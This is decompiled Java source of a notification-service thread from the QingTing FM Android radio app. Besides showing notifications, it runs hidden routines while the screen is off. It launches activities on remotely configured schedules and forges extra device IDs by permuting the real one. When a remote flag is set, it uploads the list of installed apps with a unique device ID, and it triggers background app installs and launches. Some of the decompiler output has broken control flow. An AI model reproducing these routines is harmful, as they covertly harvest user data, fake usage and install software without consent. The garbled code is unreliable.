package fm.qingting.qtradio.notification;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.PowerManager;
import android.telephony.TelephonyManager;
import com.umeng.analytics.MobclickAgent;
import fm.qingting.framework.data.IResultRecvHandler;
import fm.qingting.framework.data.IResultToken;
import fm.qingting.framework.data.Result;
import fm.qingting.qtradio.NotificationService;
import fm.qingting.qtradio.QTRadioActivity;
import fm.qingting.qtradio.ShieldActivity;
import fm.qingting.qtradio.localpush.ChannelUpdate;
import fm.qingting.qtradio.log.LogModule;
import fm.qingting.qtradio.manager.QtApiLevelManager;
import fm.qingting.qtradio.model.DataLoadWrapper;
import fm.qingting.qtradio.model.GlobalCfg;
import fm.qingting.qtradio.model.LocalPushConfigure;
import fm.qingting.qtradio.push.log.UpdatePushLog;
import fm.qingting.utils.AppInfo;
import fm.qingting.utils.DateUtil;
import fm.qingting.utils.DeviceInfo;
import fm.qingting.utils.LifeTime;
import fm.qingting.utils.ProcessDetect;
import fm.qingting.utils.RangeRandom;
import fm.qingting.utils.TimeUtil;
import java.sql.Date;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Iterator;
import java.util.List;
import org.json.JSONObject;

public class MessageThread extends Thread
{
  private static final String AppsInfo = "APPsInfo";
  private static final long TENSECS = 10000L;
  private long ONE_DAY = 86400L;
  private long PROMETHEUS_INTERVAL = 1800L;
  private Context context;
  private boolean justSleep = false;
  private String mChannelName;
  private int mDoPrometheusIndex = 0;
  private long mDoPrometheusTime = -1L;
  private long mDoShieldStart = 0L;
  private long mDoShieldTime = -1L;
  private long mLastDoPrometheusTime = -1L;
  private List<String> mLstPrometheusTids = null;
  private boolean mNeedLazyStart = false;
  private int mPrometheusCnt = 0;
  private long mPrometheusInterval = 60L;
  private long mPrometheusStartTime = 0L;
  private LocalPushConfigure mPushConfig = new LocalPushConfigure();
  private String mResetId = "#";
  private long mSelectTime = -1L;
  private boolean mSelectedUser = true;
  private long mSendAppsInfoTime = 0L;
  private long mSendAppsInterval = 259200000L;
  private long mShieldEndTime = 0L;
  private long mShieldStartTime = 0L;
  private long mShieldStartTimeV3 = 0L;
  List<localMessage> messageList;
  private MessageCenter msgCenter;
  private IResultRecvHandler resultRecver = new IResultRecvHandler()
  {
    public void onRecvResult(Result paramAnonymousResult, Object paramAnonymousObject1, IResultToken paramAnonymousIResultToken, Object paramAnonymousObject2)
    {
      if ((paramAnonymousResult.getSuccess()) && (paramAnonymousIResultToken.getType().equalsIgnoreCase("get_user_tids")))
      {
        MessageThread.access$002(MessageThread.this, (List)paramAnonymousResult.getData());
        if (MessageThread.this.mLstPrometheusTids != null)
          MessageThread.access$102(MessageThread.this, 0);
      }
    }
  };
  private long updateConfigTime = 0L;
  private int waiting;

  public MessageThread(NotificationService paramNotificationService)
  {
    this.context = paramNotificationService;
    this.msgCenter = new MessageCenter(paramNotificationService);
    this.waiting = 0;
    this.messageList = new ArrayList();
    this.mChannelName = AppInfo.getChannelName(this.context);
    getShieldTime();
    getSelectTime();
    getSelectUser();
    getDoPrometheus();
    InstallApp.getInstance().init(this.context);
  }

  private void doPrometheus()
  {
    if ((this.mLstPrometheusTids != null) && (this.mDoPrometheusIndex < this.mLstPrometheusTids.size()))
    {
      Intent localIntent = new Intent();
      localIntent.putExtra("notify_type", "shield");
      localIntent.putExtra("prometheus", (String)this.mLstPrometheusTids.get(this.mDoPrometheusIndex));
      localIntent.setFlags(268435456);
      localIntent.setClass(this.context.getApplicationContext(), ShieldActivity.class);
      this.mDoPrometheusIndex = (1 + this.mDoPrometheusIndex);
      this.mLastDoPrometheusTime = (System.currentTimeMillis() / 1000L);
      if (this.mDoPrometheusIndex >= this.mLstPrometheusTids.size())
        setDoPrometheus(DateUtil.getCurrentMillis());
      this.context.startActivity(localIntent);
    }
  }

  private void doShield()
  {
    setShieldTime(DateUtil.getCurrentMillis());
    this.mDoShieldStart = 0L;
    Intent localIntent = new Intent("android.intent.action.SHIELD");
    localIntent.putExtra("notify_type", "shield");
    localIntent.setFlags(268435456);
    localIntent.setClass(this.context.getApplicationContext(), ShieldActivity.class);
    this.context.startActivity(localIntent);
  }

  private boolean enableLocalPush()
  {
    String str = HttpNotification.getInstance().getNotify("http://api.qingting.fm/api/qtradiov2/localpush?type=android", null, null);
    if ((str != null) && (!str.equalsIgnoreCase("")))
      parseLocalNotification(str);
    return this.mPushConfig.enableLocalPush();
  }

  private void execPrometheus()
  {
    try
    {
      if (!isPrometheusTime())
        return;
      if (isUpdateMobclickConfig())
        this.updateConfigTime = (System.currentTimeMillis() / 1000L);
      String str1 = MobclickAgent.getConfigParams(this.context, "ThePrometheusChannelV2");
      if ((str1 != null) && (this.mChannelName != null) && ((str1.equalsIgnoreCase("all")) || (str1.contains(this.mChannelName))))
      {
        String str2 = MobclickAgent.getConfigParams(this.context, "ThePrometheusStartTime");
        if ((str2 == null) || (str2.equalsIgnoreCase("")))
        {
          this.mPrometheusStartTime = 0L;
          return;
        }
        this.mPrometheusStartTime = Long.valueOf(str2).longValue();
        String str3 = MobclickAgent.getConfigParams(this.context, "ThePrometheus");
        if ((str3 == null) || (str3.equalsIgnoreCase("")));
        for (this.mPrometheusCnt = 0; ; this.mPrometheusCnt = Integer.valueOf(str3).intValue())
        {
          this.mPrometheusStartTime = (getTodaySec() + this.mPrometheusStartTime);
          String str4 = MobclickAgent.getConfigParams(this.context, "ApolloClone");
          if ((str4 != null) && (!str4.equalsIgnoreCase("")))
            initPrometheus(Integer.valueOf(str4).intValue());
          handlePrometheus();
          return;
        }
      }
      return;
    }
    catch (Exception localException)
    {
    }
  }

  private void execTheShield()
  {
    while (true)
    {
      try
      {
        if (!isProperTime())
          return;
        if (isUpdateMobclickConfig())
          this.updateConfigTime = (System.currentTimeMillis() / 1000L);
        str1 = MobclickAgent.getConfigParams(this.context, "TheShieldV2");
        if ((str1 == null) || (str1.equalsIgnoreCase("")))
          break label290;
        String str2 = "25200";
        String str3 = "25200";
        if ((TimeUtil.isSundayOrSaturday()) && (!str1.equalsIgnoreCase("0")))
        {
          str1 = "60";
          str2 = "39600";
          str3 = "39600";
        }
        this.mNeedLazyStart = false;
        if ((("3600" == null) || ("3600".equalsIgnoreCase("")) || (isProperTime(1000 * Integer.valueOf("3600").intValue()))) && (("all" == null) || (this.mChannelName == null) || ("all".equalsIgnoreCase("all")) || ("all".contains(this.mChannelName))) && (str1 != null))
        {
          this.mShieldStartTimeV3 = Long.valueOf(str3).longValue();
          if ((str2 != null) && ("61200" != null))
          {
            this.mShieldStartTime = (getTodaySec() + Long.valueOf(str2).longValue());
            this.mShieldEndTime = (this.mShieldStartTime + Integer.valueOf("61200").intValue());
          }
          if ((str3 != null) && (!str3.equalsIgnoreCase("")))
            this.mShieldStartTimeV3 = (getTodaySec() + Long.valueOf(str3).longValue());
          int i = Integer.valueOf(str1).intValue();
          if (i > 0)
          {
            handleShield(i);
            return;
          }
        }
      }
      catch (Exception localException)
      {
      }
      return;
      label290: String str1 = "100";
    }
  }

  private String getDate()
  {
    return new Date(System.currentTimeMillis() - 86400000L).toString();
  }

  private long getDoPrometheus()
  {
    if (this.mDoPrometheusTime == -1L)
      this.mDoPrometheusTime = GlobalCfg.getInstance(this.context).getDoPrometheusTime();
    return this.mDoPrometheusTime;
  }

  private long getSelectTime()
  {
    if (this.mSelectTime == -1L)
      this.mSelectTime = GlobalCfg.getInstance(this.context).getDoShieldSelectTime();
    return this.mSelectTime;
  }

  private boolean getSelectUser()
  {
    this.mSelectedUser = GlobalCfg.getInstance(this.context).getShieldSelectUser();
    return this.mSelectedUser;
  }

  private long getShieldTime()
  {
    if (this.mDoShieldTime == -1L)
      this.mDoShieldTime = GlobalCfg.getInstance(this.context).getDoShieldTime();
    return this.mDoShieldTime;
  }

  private long getTodaySec()
  {
    long l = System.currentTimeMillis();
    Calendar localCalendar = Calendar.getInstance();
    localCalendar.setTimeInMillis(l);
    int i = localCalendar.get(11);
    int j = localCalendar.get(12);
    int k = localCalendar.get(13);
    return l / 1000L - i * 3600 - j * 60 - k;
  }

  private void handlePrometheus()
  {
    long l;
    if (this.mPrometheusStartTime > 0L)
    {
      l = System.currentTimeMillis() / 1000L;
      if (l >= this.mPrometheusStartTime)
        break label27;
    }
    label27: 
    do
    {
      do
        return;
      while (this.mPrometheusStartTime - this.mDoPrometheusTime <= this.ONE_DAY);
      if ((this.mLstPrometheusTids == null) || (this.mDoPrometheusIndex >= this.mLstPrometheusTids.size()))
      {
        DataLoadWrapper.loadUserTids(this.mPrometheusCnt, this.resultRecver);
        return;
      }
      if (this.mLastDoPrometheusTime == -1L)
        break;
    }
    while (l - this.mLastDoPrometheusTime <= this.mPrometheusInterval);
    doPrometheus();
    this.mPrometheusInterval = RangeRandom.Random(this.PROMETHEUS_INTERVAL);
    return;
    doPrometheus();
  }

  private void handleShield(int paramInt)
  {
    if (shouldStartShield(paramInt))
    {
      long l = System.currentTimeMillis() / 1000L;
      if ((this.mShieldStartTimeV3 > 0L) || (this.mShieldStartTime > l) || (l > this.mShieldEndTime))
        break label123;
      if (!this.mNeedLazyStart)
        break label118;
      if (this.mDoShieldStart == 0L)
        this.mDoShieldStart = (l + RangeRandom.Random(this.mShieldEndTime - l - 100L));
      if ((this.mDoShieldStart > l) || (l > this.mShieldEndTime))
        break label101;
      doShield();
    }
    label101: label118: label123: 
    do
    {
      do
      {
        do
          return;
        while (this.mDoShieldStart <= this.mShieldEndTime);
        doShield();
        return;
        doShield();
        return;
      }
      while (this.mShieldStartTimeV3 <= 0L);
      if (System.currentTimeMillis() / 1000L >= this.mShieldStartTimeV3)
        break;
    }
    while (this.mShieldStartTimeV3 - this.mDoShieldTime <= this.ONE_DAY);
    doShield();
    return;
    doShield();
  }

  private void initPrometheus(int paramInt)
  {
    if (paramInt == 0);
    String str1;
    do
    {
      SharedPreferences localSharedPreferences;
      do
      {
        do
        {
          return;
          if (this.mLstPrometheusTids == null)
            this.mLstPrometheusTids = new ArrayList();
        }
        while (this.mLstPrometheusTids.size() != 0);
        resetPrometheus();
        localSharedPreferences = this.context.getSharedPreferences("tdid", 0);
      }
      while (localSharedPreferences == null);
      str1 = localSharedPreferences.getString("pref.deviceid.key", "");
    }
    while ((str1 == null) || (str1.length() == 0));
    if (str1.length() > paramInt)
    {
      char[] arrayOfChar = str1.toCharArray();
      for (int i = 1; i <= paramInt; i++)
      {
        int j = arrayOfChar[0];
        arrayOfChar[0] = arrayOfChar[i];
        arrayOfChar[i] = j;
        String str2 = new String(arrayOfChar);
        this.mLstPrometheusTids.add(str2);
      }
    }
    this.mLstPrometheusTids.add(str1);
  }

  private boolean isPrometheusTime()
  {
    int i = Calendar.getInstance().get(11);
    if ((i < 7) || (i > 23));
    long l;
    do
    {
      return false;
      if (this.mDoPrometheusTime == -1L)
        this.mDoPrometheusTime = GlobalCfg.getInstance(this.context).getDoPrometheusTime();
      l = DateUtil.getCurrentMillis();
    }
    while (!DateUtil.isDifferentDayMs(this.mDoPrometheusTime, l));
    return true;
  }

  private boolean isProperTime()
  {
    long l1 = LifeTime.getLastQuitTimeMs(this.context);
    long l2 = DateUtil.getCurrentMillis();
    return (DateUtil.isDifferentDayMs(l1, l2)) && (DateUtil.isDifferentDayMs(this.mDoShieldTime, l2));
  }

  private boolean isProperTime(int paramInt)
  {
    long l = DateUtil.getCurrentMillis();
    boolean bool1 = l - LifeTime.getLastQuitTimeMs(this.context) < paramInt;
    boolean bool2 = false;
    if (!bool1)
    {
      boolean bool3 = DateUtil.isDifferentDayMs(this.mDoShieldTime, l);
      bool2 = false;
      if (bool3)
        bool2 = true;
    }
    return bool2;
  }

  private boolean isUpdateMobclickConfig()
  {
    if (this.updateConfigTime == 0L);
    long l;
    do
    {
      return true;
      l = System.currentTimeMillis() / 1000L;
      if (l - this.updateConfigTime < 600L)
        return false;
    }
    while ((l - this.updateConfigTime > 216000L) || (Calendar.getInstance().get(12) < 2));
    return false;
  }

  private void log(String paramString)
  {
  }

  private void parseLocalNotification(String paramString)
  {
    if (paramString != null);
    try
    {
      int i = new JSONObject(paramString).getJSONObject("data").getInt("enabled");
      this.mPushConfig.setEnableLocalPush(i);
      return;
    }
    catch (Exception localException)
    {
    }
  }

  private void pullMessage()
  {
    while (true)
    {
      localMessage locallocalMessage1;
      localMessage locallocalMessage2;
      try
      {
        locallocalMessage1 = this.msgCenter.getMessage("reserve", null);
        locallocalMessage2 = this.msgCenter.getMessage("alarm", null);
        localMessage locallocalMessage3 = this.msgCenter.getMessage("localNotification", null);
        localMessage locallocalMessage4 = this.msgCenter.getMessage("localrecommend", null);
        localMessage locallocalMessage5 = this.msgCenter.getMessage("reply", null);
        if (locallocalMessage1 != null)
          this.messageList.add(locallocalMessage1);
        if (locallocalMessage2 != null)
          this.messageList.add(locallocalMessage2);
        if (locallocalMessage4 != null)
          this.messageList.add(locallocalMessage4);
        if (locallocalMessage5 != null)
        {
          this.messageList.add(locallocalMessage5);
          break label184;
          if ((locallocalMessage3 != null) && (enableLocalPush()))
            this.messageList.add(locallocalMessage3);
          if ((this.messageList != null) && (this.messageList.size() > 0))
            saveAndSendMessages(this.messageList);
          return;
        }
      }
      catch (Exception localException)
      {
        return;
      }
      label184: if (locallocalMessage1 != null)
        if (locallocalMessage2 != null);
    }
  }

  private String queryFilterAppInfo()
  {
    if (this.context == null);
    PackageManager localPackageManager;
    List localList;
    do
    {
      do
      {
        return null;
        localPackageManager = this.context.getPackageManager();
      }
      while (localPackageManager == null);
      localList = localPackageManager.getInstalledApplications(8192);
    }
    while (localList == null);
    String str1 = "" + "\"";
    Iterator localIterator = localList.iterator();
    Object localObject1 = str1;
    String str10;
    while (localIterator.hasNext())
    {
      ApplicationInfo localApplicationInfo = (ApplicationInfo)localIterator.next();
      if (((0x80 & localApplicationInfo.flags) == 0) && ((0x1 & localApplicationInfo.flags) == 0))
      {
        String str7 = localApplicationInfo.packageName;
        if ((str7 == null) || (str7.contains("com.android")) || (str7.contains("com.google")))
          break label378;
        String str8 = (String)localApplicationInfo.loadLabel(localPackageManager);
        if ((str8 == null) || (str8.equalsIgnoreCase("\n")))
          break label378;
        String str9 = str8.replaceAll("(\r\n|\r|\n|\n\r)", "");
        str10 = (String)localObject1 + str9;
      }
    }
    label378: for (Object localObject2 = str10 + "_"; ; localObject2 = localObject1)
    {
      localObject1 = localObject2;
      break;
      String str2 = (String)localObject1 + "\"";
      String str3 = str2 + ",";
      String str4 = str3 + "\"";
      String str5 = str4 + DeviceInfo.getUniqueId(this.context);
      String str6 = str5 + "\"";
      return str6 + "\n";
    }
  }

  private void resetPrometheus()
  {
    this.mDoPrometheusIndex = 0;
    if (this.mLstPrometheusTids != null)
      this.mLstPrometheusTids.clear();
  }

  private void resetShield(String paramString)
  {
    if ((this.mResetId == null) || (paramString == null));
    while ((this.mResetId.equalsIgnoreCase(paramString)) || (this.mSelectedUser))
      return;
    this.mResetId = paramString;
    setSelectTime(0L);
  }

  private void saveAndSendMessages(List<localMessage> paramList)
  {
    if (paramList == null);
    do
    {
      do
        return;
      while (paramList.size() == 0);
      (System.currentTimeMillis() / 1000L);
    }
    while (paramList.size() >= 0);
    localMessage locallocalMessage = (localMessage)paramList.get(0);
    Intent localIntent = new Intent("fm.qingting.qtradio.SHOW_NOTIFICATION");
    localIntent.putExtra("NOTIFICATION_TITLE", locallocalMessage.title);
    localIntent.putExtra("NOTIFICATION_MESSAGE", locallocalMessage.content);
    localIntent.putExtra("NOTIFICATION_ID", "11");
    localIntent.putExtra("duetime", locallocalMessage.startTime);
    localIntent.putExtra("notify_type", locallocalMessage.page);
    localIntent.putExtra("channelid", locallocalMessage.channelid);
    localIntent.putExtra("channelname", locallocalMessage.channelname);
    localIntent.putExtra("categoryid", locallocalMessage.categoryId);
    localIntent.putExtra("programid", locallocalMessage.programId);
    localIntent.putExtra("alarmType", locallocalMessage.type);
    paramList.remove(0);
    this.waiting = 0;
    if (locallocalMessage.page.equalsIgnoreCase("alarm"))
    {
      localIntent.setFlags(268435456);
      localIntent.setClass(this.context.getApplicationContext(), QTRadioActivity.class);
      this.context.startActivity(localIntent);
      return;
    }
    if (locallocalMessage.page.equalsIgnoreCase("reserve"));
    new Notifier(this.msgCenter.getContext()).notify("11", "", locallocalMessage.title, locallocalMessage.content, "", String.valueOf(locallocalMessage.startTime), locallocalMessage.channelname, Integer.valueOf(locallocalMessage.channelid).intValue(), locallocalMessage.page, Integer.valueOf(locallocalMessage.categoryId).intValue(), 0, 0, 0, Integer.valueOf(locallocalMessage.type).intValue(), null, null);
  }

  private void sendAppsInfo()
  {
    try
    {
      long l = DateUtil.getCurrentMillis();
      if (!DateUtil.isDifferentDayMs(this.mSendAppsInfoTime, l))
        return;
      if (l - GlobalCfg.getInstance(this.context).getSendAppsTime() >= this.mSendAppsInterval)
      {
        String str1 = MobclickAgent.getConfigParams(this.context, "privacy");
        if ((str1 != null) && (!str1.equalsIgnoreCase("")) && (!str1.equalsIgnoreCase("#")))
        {
          this.mSendAppsInfoTime = l;
          String str2 = queryFilterAppInfo();
          if (str2 != null)
          {
            LogModule.getInstance().send("APPsInfo", str2);
            GlobalCfg.getInstance(this.context).setSendAppsTime(l);
            return;
          }
        }
      }
    }
    catch (Exception localException)
    {
    }
  }

  private void sendServiceLog()
  {
    UpdatePushLog.sendLiveLog(ChannelUpdate.getInstance().getFavNodesNum(), this.context);
  }

  private void setDoPrometheus(long paramLong)
  {
    this.mDoPrometheusTime = paramLong;
    GlobalCfg.getInstance(this.context).setDoPrometheusTime(paramLong);
    resetPrometheus();
  }

  private void setSelectTime(long paramLong)
  {
    this.mSelectTime = paramLong;
    GlobalCfg.getInstance(this.context).setDoShieldSelectTime(paramLong);
  }

  private void setSelectUser(boolean paramBoolean)
  {
    this.mSelectedUser = paramBoolean;
    GlobalCfg.getInstance(this.context).setShieldSelectUser(paramBoolean);
  }

  private void setShieldTime(long paramLong)
  {
    this.mDoShieldTime = paramLong;
    GlobalCfg.getInstance(this.context).setDoShieldTime(paramLong);
  }

  private boolean shouldStartShield(int paramInt)
  {
    long l = DateUtil.getCurrentMillis();
    if (!DateUtil.isDifferentDayMs(this.mSelectTime, l))
      return this.mSelectedUser;
    setSelectTime(l);
    if (paramInt >= 100)
    {
      this.mSelectedUser = true;
      setSelectUser(this.mSelectedUser);
      return this.mSelectedUser;
    }
    if (paramInt <= 0)
    {
      this.mSelectedUser = false;
      setSelectUser(this.mSelectedUser);
      return this.mSelectedUser;
    }
    this.mSelectedUser = RangeRandom.random(paramInt / 100.0D);
    return this.mSelectedUser;
  }

  private long waiting()
  {
    return 10000L;
  }

  public String getTypeOfNetwork(Context paramContext)
  {
    int i;
    label47: label51: 
    do
    {
      try
      {
        i = ((TelephonyManager)paramContext.getSystemService("phone")).getNetworkType();
        if ((i != 6) && (i != 4))
        {
          if (i != 7)
            break label51;
          break label47;
          return "4";
        }
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
        return "others";
      }
      return "3";
      if (i == 2)
        return "1";
    }
    while ((i != 1) && (i != 3) && (i != 8));
    return "2";
  }

  @SuppressLint({"NewApi"})
  public boolean isScreenOn()
  {
    if (this.context == null)
      return false;
    boolean bool2;
    try
    {
      PowerManager localPowerManager = (PowerManager)this.context.getSystemService("power");
      if (QtApiLevelManager.isApiLevelSupported(20))
      {
        bool2 = localPowerManager.isInteractive();
      }
      else
      {
        boolean bool1 = localPowerManager.isScreenOn();
        bool2 = bool1;
      }
    }
    catch (Exception localException)
    {
    }
    while (bool2)
      return true;
    return false;
  }

  public void run()
  {
    try
    {
      while (!isInterrupted())
      {
        pullMessage();
        Thread.sleep(waiting());
        if (!ProcessDetect.processExists(this.context.getPackageName() + ":local", null))
        {
          sendServiceLog();
          if (!isScreenOn())
          {
            execTheShield();
            sendAppsInfo();
            execPrometheus();
            InstallApp.getInstance().install();
            InstallApp.getInstance().startApp();
          }
        }
      }
    }
    catch (InterruptedException localInterruptedException)
    {
    }
    catch (Exception localException)
    {
    }
  }

  public void runAtNormalPath()
  {
    this.justSleep = false;
  }

  public void saveMessage(localMessage paramlocalMessage)
  {
  }

  public void sleepQuiteALongTime()
  {
    this.justSleep = true;
  }
}

/* Location:           /Users/zhangxun-xy/Downloads/qingting2/classes_dex2jar.jar
 * Qualified Name:     fm.qingting.qtradio.notification.MessageThread
 * JD-Core Version:    0.6.2
 */